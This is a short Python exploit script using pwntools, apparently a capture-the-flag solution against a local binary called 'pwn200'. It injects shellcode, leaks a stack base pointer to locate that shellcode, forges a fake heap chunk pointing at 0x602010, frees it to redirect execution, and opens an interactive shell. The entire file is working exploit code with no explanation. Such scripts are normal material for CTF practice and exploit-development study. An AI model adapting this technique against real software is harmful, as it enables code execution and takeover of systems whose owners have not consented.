from pwn import *

r = process('./pwn200')
context.arch = 'amd64'
sh = asm(shellcraft.sh())

# Leak main rbp
r.recvline()
r.send(sh)
r.recvuntil(sh)
rbp = u64(r.recv(6) + b'\0\0')
sh_add = rbp - 0x50
r.recvline()
success('main rbp => %s' % hex(rbp))
success('shellcode address => %s' % hex(sh_add))

# Fake size
r.recvline()
r.sendline(b'1')

# Fake chunk
r.recvline()
pause()
r.send(p64(sh_add) * 7 + p64(0x602010))

# Free fake chunk
r.sendlineafter('ce : ', b'2')

r.interactive()
